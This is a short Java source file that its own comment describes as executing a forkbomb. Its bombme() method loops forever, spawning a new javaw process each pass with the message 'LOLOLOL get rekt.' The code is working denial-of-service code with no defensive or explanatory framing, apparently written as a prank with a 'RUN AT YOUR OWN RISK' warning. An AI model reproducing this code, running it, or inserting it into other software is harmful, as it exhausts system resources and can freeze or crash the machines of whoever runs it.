/**
 * Executes a forkbomb.
 * 
 * @author schafezp. Created Nov 5, 2015.
 */
public class bomb
{
	/**
	 * RUN AT YOUR OWN RISK.
	 *
	 * @throws java.io.IOException
	 */
	public static void bombme() throws java.io.IOException
	{
		while (true)
		{
			Runtime.getRuntime().exec(new String[]
			{ "javaw", "-cp", System.getProperty("java.class.path"), "LOLOLOL get rekt." });
		}
	}
}